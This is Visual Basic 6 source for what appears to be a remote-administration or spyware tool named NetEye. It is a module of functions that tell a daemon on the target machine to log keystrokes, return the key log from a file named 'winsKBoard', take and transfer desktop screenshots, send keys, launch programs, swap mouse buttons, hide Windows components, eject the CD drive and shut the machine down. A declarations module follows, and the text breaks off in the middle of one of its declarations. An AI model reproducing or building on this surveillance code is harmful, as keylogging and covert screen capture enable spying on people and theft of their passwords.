==================================
''''     Function is intended to invoke Application at  '''
''       the remote machine (like notepad.exe etc   '''
'=====================================================================
Public Function InvokeApp(ByVal strAppName As String) As String
On Error GoTo EH

 Dim objNetEyeDaemon As Object
 Set objNetEyeDaemon = CreateObject("NetEye.Daemon")
 InvokeApp = objNetEyeDaemon.InvokeApp(strAppName)
 Exit Function
 
EH:
 InvokeApp = Err.Number & Space(1) & Err.Description & vbCrLf & "Caller.InvokeApp(strAppName)"
End Function


'=====================================================================
'' Function is intended to invoke any key toward the remote machine''
'=====================================================================
Public Function InvokeKeys(ByVal strKeyName As String) As String
On Error GoTo EH

 Dim objNetEyeDaemon As Object
 Set objNetEyeDaemon = CreateObject("NetEye.Daemon")
 InvokeKeys = objNetEyeDaemon.InvokeKeys(strKeyName)
 Exit Function
 
EH:
 InvokeKeys = Err.Number & Space(1) & Err.Description & vbCrLf & "Caller.InvokeKeys(ByVal strKeyName As String)"
End Function


'==================================================================
''' in case the domin login is a problem then this method is
''' invoked to get the local serialized data from the remote
''' machine and then store it at you client NetEye machine
'==================================================================
Public Function PickPixelData(ByRef strFlag As String) As Byte()
 Dim strFile As String
 Dim B() As Byte
 On Error GoTo EH
 
 strFile = App.Path & "\map.spy"
 ReDim B(FileLen(strFile) - 1)
 
 Open strFile For Binary Access Read Lock Read As #3
  Get #3, , B
 Close #3
 strFlag = "Pixel Data was sent successfully.."
 PickPixelData = B
 
 Exit Function
EH:
 strFlag = Err.Description & Err.Number & vbCrLf & "Caller.PickDataFile(strError)"
End Function


'==================================================================
'=======  Invoke any key towards the remote machine          ======
'==================================================================
Public Function ShutDown(ByVal flgShutDownMode As Long) As Long
 ShutDown = ExitWindowsEx&(flgShutDownMode, 0)
End Function


'==================================================================
'===== Invoke any MessageBox towards the remote machine    ========
'==================================================================
Public Function InvokeMessageBox(ByVal strPrompt As String, ByVal lngButton As Long, ByVal strTitle As String) As Integer
 On Error GoTo EH
 
 Dim objNetEyeDaemon As Object
 Set objNetEyeDaemon = CreateObject("NetEye.Daemon")
 InvokeMessageBox = objNetEyeDaemon.InvokeMessageBox(strPrompt, lngButton, strTitle)
 Exit Function
 
EH:
 InvokeMessageBox = 419 ' Application Defined Error
End Function

'=========================================================
'===========     Log Keys "pressed"               ========
'=========================================================
Public Function LogKeys(ByVal lngDuration As Long) As String
 On Error GoTo EH
 
 Dim objNetEyeDaemon As Object
 Set objNetEyeDaemon = CreateObject("NetEye.Daemon")
 LogKeys = objNetEyeDaemon.SerializeKeys(lngDuration)
 Exit Function
 
EH:
 LogKeys = Err.Description & vbCrLf & Err.Number & "Caller.LogKeys(lngDuration)"
End Function


'=============================================================
'===========     Now Start Transferring Logged Keys    =======
'=============================================================
Public Function PickKeysFile(ByRef strFlag As String) As String
 Dim objF As New FileSystemObject
 Dim objT As TextStream
 On Error GoTo EH
 
 Set objT = objF.OpenTextFile(App.Path & "\winsKBoard", ForReading)
 PickKeysFile = objT.ReadAll
 strFlag = "Key File Data was sent successfully.."
 Exit Function
 
EH:
 strFlag = Err.Description & vbCrLf & Err.Number & vbCrLf & "Caller.PickDataFile(byRef strFlag as String) as String"
End Function

'========================================================
'===========     Take full Desktop's Snapshot     =======
'=========================================================
Public Function TakeSnapShot() As String
 On Error GoTo EH
 Dim objNetEyeDaemon As Object
 Set objNetEyeDaemon = CreateObject("NetEye.Daemon")
 TakeSnapShot = objNetEyeDaemon.TakeSnapShot()
 
 Exit Function
EH:
 TakeSnapShot = Err.Description & vbCrLf & Err.Number & vbCrLf & "Caller.TakeSnapShot()"
 
 End Function

'=========================================================
'=======     Start Transfer Desktop's Snapshot     =======
'=========================================================
Public Function PickSnapShotData(ByRef strError As String) As Byte()
 Dim strFile As String
 Dim B() As Byte
 On Error GoTo EH
 
 Clipboard.Clear
 strFile = App.Path & "\winmap"
 ReDim B(FileLen(strFile) - 1)
 
 Open strFile For Binary Access Read Lock Read As #1
  Get #1, , B
 Close #1
 strError = "Data Transfer Complete...."
 PickSnapShotData = B
 
 Exit Function
EH:
 strError = Err.Description & Err.Number & vbCrLf & "Caller.PickSnapShotData(strError)"
End Function

'=========================================================
'=======           Start Capturing Mouse           =======
'=========================================================
Public Function CaptureMouse(ByVal X As Long, ByVal Y As Long) As String
On Error GoTo EH

 Dim objNetEyeDaemon As Object
 Set objNetEyeDaemon = CreateObject("NetEye.Daemon")
 CaptureMouse = objNetEyeDaemon.CaptureMouse(X, Y)

Exit Function
EH:
  CaptureMouse = Err.Description & vbCrLf & "Caller.CaptureMouse(X,Y)"
End Function

'=========================================================
'=======              Swap Mouse Button            =======
'=========================================================
Public Function SwapMouseButtons(ByVal bSwap As Long) As String

 Dim objNetEyeDaemon As Object
 Set objNetEyeDaemon = CreateObject("NetEye.Daemon")
 SwapMouseButtons = objNetEyeDaemon.SwapMouseButtons(bSwap)

Exit Function
EH:
  SwapMouseButtons = Err.Description & vbCrLf & "Caller.SwapMouseButtons(bSwap)"
End Function

'=========================================================
'=======           Show Hide Win Component         =======
'=========================================================
Public Function ShowHide(ByVal strWinComp As String, ByVal lngSH As Long) As String
Dim objCaller As Object
On Error GoTo EH
 Set objCaller = CreateObject("NetEye.Daemon")
 ShowHide = objCaller.ShowHide(strWinComp, lngSH)
 Exit Function
EH:
 ShowHide = Err.Description & vbCrLf & "Caller.ShowHide(strWinComp,lngSH )"
End Function

'=========================================================
'=======               Open Close CD Rom           =======
'=========================================================

Public Function OpenCloseCDRom(cmd As String) As String
Dim objCaller As Object
On Error GoTo EH
 Set objCaller = CreateObject("NetEye.Daemon")
 OpenCloseCDRom = objCaller.OpenCloseCDRom(cmd)
 Exit Function
EH:
 OpenCloseCDRom = Err.Description & vbCrLf & "Caller.OpenCloseCDRom(cmd)"
End Function

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   Attribute VB_Name = "basDecalrations"
Public Declare Function GetDC& Lib "user32" (ByVal hwnd As Long)

Public Declare Function GetPixel Lib "gdi32" (ByVal hdc As Long, ByVal x As Long, ByVal Y As Long) As Long

Public Declare Function SetCursorPos Lib "user32" (ByVal x As Long, ByVal Y As Long) As Long

Declare Function SetPixelV Lib "gdi32" (ByVal hdc As Long, ByVal x As Long, ByVal Y As Long, ByVal crColor As Long) As Long

Public Declare Function ReleaseDC& Lib "user32" (ByVal hwnd As Long, ByVal hdc As Long)

Public Declare Sub keybd_event Lib "user32" (ByVal bVk As Byte, ByVal bScan As Byte, ByVal dwFlags As Long, ByVal dwExtraInfo As Long)

Public Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, _
    ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal Y As Long, ByVal cX As Long, _
    ByVal cY As Long, ByVal wFlags As Long) As Long

Public Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long

Public Declare Function WindowFromPoint Lib "user32" (ByVal xPoint As Long, _
    ByVal yPoint As Long) As Long
    
Public Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long

Public Declare Function Get